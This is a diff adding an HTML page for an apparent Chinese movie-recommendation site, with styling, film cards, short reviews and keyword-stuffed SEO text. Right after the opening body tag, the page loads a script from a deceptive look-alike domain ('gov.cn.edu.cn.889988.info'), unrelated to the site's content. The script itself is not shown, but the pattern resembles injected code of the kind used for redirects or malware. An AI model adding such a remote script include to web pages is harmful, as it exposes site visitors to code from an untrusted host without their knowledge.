@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>新新电影网 - 最新高清电影推荐与前沿影视资讯平台</title>
+    <meta name="description" content="新新电影网（xinxindianyingwang-top.github.io）为您提供最新、最热门的高清电影推荐、前沿影视资讯及深度专业影评。访问新新电影网，第一时间发现触动人心的好电影。">
+    <meta name="keywords" content="新新电影网, 最新电影, 高清电影推荐, 影视资讯, 专业影评, xinxindianyingwang-top.github.io">
+    <meta name="robots" content="index, follow">
+    <style>
+        /* 基础重置与全局设定 */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Inter', 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif; 
+            color: #2d3748; 
+            line-height: 1.7; 
+            min-height: 100vh;
+            /* 流动渐变背景 */
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background: 
+                radial-gradient(circle at 15% 50%, rgba(255, 183, 197, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 85% 30%, rgba(183, 220, 255, 0.4) 0%, transparent 50%),
+                radial-gradient(circle at 50% 80%, rgba(214, 183, 255, 0.4) 0%, transparent 50%),
+                linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            background-size: 200% 200%;
+            animation: gradientMove 15s ease infinite;
+        }
+        a { text-decoration: none; color: #667eea; transition: all 0.3s ease; }
+        a:hover { color: #764ba2; }
+        ul { list-style: none; }
+        
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        /* 玻璃拟态通用类 */
+        .glass {
+            background: rgba(255, 255, 255, 0.65);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 24px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+        }
+        
+        /* 布局容器 */
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 24px; }
+        
+        /* 头部区域 */
+        header { 
+            padding: 60px 0 40px; 
+            text-align: center; 
+        }
+        header h1 { 
+            font-size: clamp(2.5rem, 5vw, 4rem); 
+            font-weight: 800; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 16px;
+            letter-spacing: -1px;
+        }
+        header p { 
+            font-size: 1.15rem; 
+            color: #4a5568; 
+            max-width: 600px; 
+            margin: 0 auto; 
+            font-weight: 500;
+        }
+        
+        /* 导航栏 */
+        nav { 
+            position: sticky; 
+            top: 20px; 
+            z-index: 1000; 
+            margin-bottom: 50px;
+            padding: 12px;
+        }
+        nav ul { 
+            display: flex; 
+            justify-content: center; 
+            gap: 16px; 
+            flex-wrap: wrap;
+        }
+        nav ul li a { 
+            display: block; 
+            padding: 12px 28px; 
+            background: rgba(255, 255, 255, 0.5); 
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.6); 
+            border-radius: 50px; 
+            color: #4a5568; 
+            font-weight: 600; 
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        nav ul li a:hover { 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff; 
+            border-color: transparent;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
+        }
+        
+        /* 主体内容 */
+        main { padding-bottom: 80px; }
+        
+        /* 栏目通用样式 */
+        .section { 
+            padding: 40px; 
+            margin-bottom: 40px; 
+        }
+        .section-title { 
+            font-size: 2rem; 
+            font-weight: 800; 
+            color: #2d3748; 
+            margin-bottom: 30px; 
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .section-title::before {
+            content: '';
+            display: block;
+            width: 6px;
+            height: 32px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 4px;
+        }
+        
+        /* 栏目一：最新上映 - 卡片网格 */
+        .grid-releases { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); 
+            gap: 24px; 
+        }
+        .release-card { 
+            background: rgba(255, 255, 255, 0.7); 
+            border: 1px solid rgba(255, 255, 255, 0.6); 
+            border-radius: 20px; 
+            padding: 24px; 
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .release-card:hover { 
+            transform: translateY(-8px); 
+            box-shadow: 0 16px 40px rgba(102, 126, 234, 0.15);
+            background: rgba(255, 255, 255, 0.9);
+        }
+        .release-card .tag {
+            align-self: flex-start;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+        .release-card h3 { font-size: 1.3rem; font-weight: 700; line-height: 1.4; }
+        .release-card h3 a { color: #2d3748; }
+        .release-card h3 a:hover { color: #667eea; }
+        .release-card p { color: #718096; font-size: 0.95rem; }
+        
+        /* 栏目二：热门推荐 - 横向大卡片 */
+        .popular-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+        }
+        .popular-card {
+            background: linear-gradient(135deg, rgba(102,126,234,0.1) 0%, rgba(118,75,162,0.1) 100%);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 24px;
+            padding: 32px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        .popular-card:hover {
+            background: linear-gradient(135deg, rgba(102,126,234,0.2) 0%, rgba(118,75,162,0.2) 100%);
+            transform: scale(1.02);
+        }
+        .popular-card h3 { font-size: 1.6rem; margin-bottom: 12px; font-weight: 800; }
+        .popular-card h3 a { color: #2d3748; }
+        .popular-card h3 a:hover { color: #764ba2; }
+        .popular-card p { color: #4a5568; margin-bottom: 20px; }
+        .popular-card a.btn {
+            align-self: flex-start;
+            padding: 10px 24px;
+            background: #2d3748;
+            color: #fff;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .popular-card a.btn:hover { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
+        
+        /* 栏目三：影评解析 - 列表 */
+        .review-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .review-item {
+            background: rgba(255, 255, 255, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 20px;
+            padding: 24px 32px;
+            display: flex;
+            align-items: center;
+            gap: 24px;
+            transition: all 0.3s ease;
+        }
+        .review-item:hover { background: rgba(255, 255, 255, 0.9); transform: translateX(8px); }
+        .review-date {
+            min-width: 80px;
+            text-align: center;
+        }
+        .review-date .day { display: block; font-size: 2rem; font-weight: 800; color: #667eea; line-height: 1; }
+        .review-date .month { font-size: 0.9rem; color: #718096; font-weight: 600; }
+        .review-content h3 { font-size: 1.2rem; margin-bottom: 8px; font-weight: 700; }
+        .review-content h3 a { color: #2d3748; }
+        .review-content h3 a:hover { color: #764ba2; }
+        .review-content p { color: #718096; font-size: 0.95rem; }
+        
+        /* 栏目四：关于本站 */
+        .about-content {
+            text-align: center;
+            padding: 20px;
+        }
+        .about-content p { 
+            color: #4a5568; 
+            font-size: 1.1rem; 
+            margin-bottom: 30px; 
+            max-width: 700px; 
+            margin-left: auto; 
+            margin-right: auto;
+        }
+        .domain-box {
+            display: inline-block;
+            background: rgba(255, 255, 255, 0.8);
+            border: 2px dashed #667eea;
+            padding: 20px 40px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+        .domain-box a {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #764ba2;
+            word-break: break-all;
+        }
+        .domain-box a:hover { color: #667eea; background: transparent; }
+        
+        /* 页脚 */
+        footer { 
+            padding: 40px 0; 
+            text-align: center; 
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            margin-top: 40px;
+        }
+        footer p { color: #718096; font-size: 0.95rem; margin-bottom: 8px; font-weight: 500; }
+        footer .keywords { color: #667eea; font-weight: 600; margin-top: 16px; }
+        
+        /* 移动端响应式 */
+        @media (max-width: 768px) {
+            header { padding: 40px 0 30px; }
+            nav { position: static; margin-bottom: 30px; }
+            nav ul { gap: 10px; }
+            nav ul li a { padding: 10px 20px; font-size: 0.9rem; }
+            .section { padding: 24px; }
+            .section-title { font-size: 1.6rem; }
+            .popular-grid { grid-template-columns: 1fr; }
+            .review-item { flex-direction: column; text-align: center; gap: 12px; padding: 24px; }
+            .review-item:hover { transform: translateY(-4px); }
+            .domain-box { padding: 16px 20px; }
+            .domain-box a { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+    <div class="container">
+        <header>
+            <h1>新新电影网</h1>
+            <p>探索前沿光影，发现最新佳作。在这里，每一帧都是对电影艺术的重新定义。</p>
+        </header>
+        
+        <nav class="glass">
+            <ul>
+                <li><a href="#">最新上映</a></li>
+                <li><a href="#">热门推荐</a></li>
+                <li><a href="#">影评解析</a></li>
+                <li><a href="#">关于本站</a></li>
+            </ul>
+        </nav>
+    </div>
+    
+    <main class="container">
+        <!-- 栏目一：最新上映 -->
+        <section class="section glass" id="releases">
+            <h2 class="section-title">最新上映</h2>
+            <div class="grid-releases">
+                <div class="release-card">
+                    <span class="tag">科幻</span>
+                    <h3><a href="#">《沙丘2》</a></h3>
+                    <p>保罗·厄崔迪与契妮联手，踏上对毁灭家族的阴谋者进行复仇的道路，开启科幻史诗新篇章。</p>
+                </div>
+                <div class="release-card">
+                    <span class="tag">悬疑</span>
+                    <h3><a href="#">《坠落的审判》</a></h3>
+                    <p>一部关于婚姻、真相与叙事的悬疑佳作，荣获戛纳金棕榈大奖，真相远比想象复杂。</p>
+                </div>
+                <div class="release-card">
+                    <span class="tag">传记</span>
+                    <h3><a href="#">《奥本海默》</a></h3>
+                    <p>诺兰用IMAX胶片捕捉原子弹之父的灵魂挣扎，年度必看神作，视听语言的极致体验。</p>
+                </div>
+                <div class="release-card">
+                    <span class="tag">剧情</span>
+                    <h3><a href="#">《美国小说》</a></h3>
+                    <p>辛辣讽刺种族议题，独立电影的黑马之作，讲述一个关于身份与叙事的荒诞故事。</p>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 栏目二：热门推荐 -->
+        <section class="section glass" id="popular">
+            <h2 class="section-title">热门推荐</h2>
+            <div class="popular-grid">
+                <div class="popular-card">
+                    <h3><a href="#">本周口碑榜：那些不可错过的冷门佳片</a></h3>
+                    <p>避开商业大片的喧嚣，我们为您精选了本周口碑最高的五部小众独立电影，每一部都直击心灵。</p>
+                    <a href="#" class="btn">查看片单</a>
+                </div>
+                <div class="popular-card">
+                    <h3><a href="#">导演特辑：是枝裕和的温情世界</a></h3>
+                    <p>从《步履不停》到《怪物》，深度解析是枝裕和如何用细腻的镜头语言，捕捉家庭关系中的微妙情感。</p>
+                    <a href="#" class="btn">阅读特辑</a>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 栏目三：影评解析 -->
+        <section class="section glass" id="reviews">
+            <h2 class="section-title">影评解析</h2>
+            <div class="review-list">
+                <div class="review-item">
+                    <div class="review-date">
+                        <span class="day">12</span>
+                        <span class="month">OCT</span>
+                    </div>
+                    <div class="review-content">
+                        <h3><a href="#">为什么《沙丘2》是近年来最好的商业科幻片？</a></h3>
+                        <p>从汉斯·季默的配乐到格里格·弗莱瑟的摄影，每一个环节都近乎完美。这不仅是一部续集，更是一场宗教与政治的宏大寓言。</p>
+                    </div>
+                </div>
+                <div class="review-item">
+                    <div class="review-date">
+                        <span class="day">10</span>
+                        <span class="month">OCT</span>
+                    </div>
+                    <div class="review-content">
+                        <h3><a href="#">《坠落的审判》：谁在书写真相？</a></h3>
+                        <p>当婚姻的私密细节被放在法庭上审判，我们是否还能分辨真相与虚构？一部让人深思的悬疑杰作，挑战观众的叙事认知。</p>
+                    </div>
+                </div>
+                <div class="review-item">
+                    <div class="review-date">
+                        <span class="day">08</span>
+                        <span class="month">OCT</span>
+                    </div>
+                    <div class="review-content">
+                        <h3><a href="#">技术狂潮下的叙事回归：为什么我们依然需要好故事？</a></h3>
+                        <p>AI生成、虚拟制作、高帧率……电影技术日新月异。但在新新电影网看来，无论技术如何进步，打动观众的永远是那个朴实而真挚的好故事。</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- 栏目四：关于本站 -->
+        <section class="section glass" id="about">
+            <h2 class="section-title">关于本站</h2>
+            <div class="about-content">
+                <p>欢迎来到<strong>新新电影网</strong>，一个致力于挖掘全球最新、最优质电影作品的前沿影视平台。我们相信，电影是跨越语言的通用艺术，也是记录时代的最佳载体。</p>
+                <div class="domain-box">
+                    <a href="https://xinxindianyingwang-top.github.io">https://xinxindianyingwang-top.github.io</a>
+                </div>
+                <p>无论是最新的好莱坞大片，还是小众的欧洲文艺片，新新电影网都为您提供专业的影评与推荐。访问我们的官方网站，开启一段美妙的电影之旅。</p>
+            </div>
+        </section>
+    </main>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 新新电影网 (xinxindianyingwang-top.github.io) 保留所有权利。</p>
+            <p>核心关键词：新新电影网 | 最新高清电影 | 前沿影视资讯 | 专业影评</p>
+            <p class="keywords">网站域名：xinxindianyingwang-top.github.io</p>
+        </div>
+    </footer>
+</body>
+</html>
